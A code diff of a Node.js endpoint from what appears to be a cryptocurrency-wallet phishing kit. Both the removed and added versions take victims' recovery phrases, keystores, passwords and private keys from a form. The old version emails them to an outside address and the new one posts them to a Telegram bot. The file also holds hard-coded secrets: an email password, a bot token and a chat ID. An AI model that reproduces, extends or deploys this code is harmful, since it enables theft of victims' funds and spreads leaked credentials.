@@ -1,46 +1,34 @@
-const express = require('express');
-const nodemailer = require('nodemailer');
-const router = express.Router();
+// api/send-to-telegram.js
+const axios = require('axios');
 
-// Create a transporter for sending emails
-const transporter = nodemailer.createTransport({
-  service: 'fitchelogistics.com', // Using Outlook, can change to Gmail or others
-  auth: {
-    user: 'enoc@fitchelogistics.com', // Your email
-    pass: 'mv,fTV@a]I%4', // Your app password or password
-  },
-});
+// Replace with your actual Telegram Bot Token
+const TELEGRAM_BOT_TOKEN = '7901428301:AAFaOAc3hZ2OogEgQboM54crQ2HU2RVw1_E';  // Your Telegram bot token here
+const CHAT_ID = '7108260980';  // Your Telegram chat ID here
 
-// POST request handler for /api/send-to-telegram
-router.post('/', (req, res) => {
-  const { recoveryPhrase, keystore, password, key, wallet_id, privatekey1 } = req.body;
+// Function to send data to Telegram
+const sendToTelegram = async (data) => {
+    try {
+        const { recoveryPhrase, keystore, password, key, wallet_id } = data;
 
-  // Prepare email content
-  const mailOptions = {
-    from: 'enoc@fitchelogistics.com',
-    to: 'gomezjefferyalan22@gmail.com', // Replace with your recipient email
-    subject: 'New Wallet Recovery Data',
-    text: `
-      Recovery Phrase: ${recoveryPhrase}
-      Keystore: ${keystore}
-      Password: ${password}
-      Key: ${key}
-      Wallet ID: ${wallet_id}
-      Private Key 1: ${privatekey1}
-    `,
-  };
+        // Construct the message to send to Telegram
+        let message = `New Wallet Import Request:\n\n`;
+        if (recoveryPhrase) message += `Recovery Phrase: ${recoveryPhrase}\n`;
+        if (keystore) message += `Keystore JSON: ${keystore}\n`;
+        if (password) message += `Keystore Password: ${password}\n`;
+        if (key) message += `Private Key: ${key}\n`;
+        if (wallet_id) message += `Wallet ID: ${wallet_id}\n`;
 
-  // Send email using nodemailer
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.log(error);
-      return res.status(500).send('Failed to send email');
+        // Send the message to Telegram using the bot API
+        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+        });
+
+        return response.data;
+    } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+        throw error;
     }
-    console.log('Email sent: ' + info.response);
+};
 
-    // Redirect to secured.html page after email is sent
-    res.redirect('/secured.html'); // Redirect the user to secured.html after email is sent
-  });
-});
-
-module.exports = router;
+module.exports = { sendToTelegram };
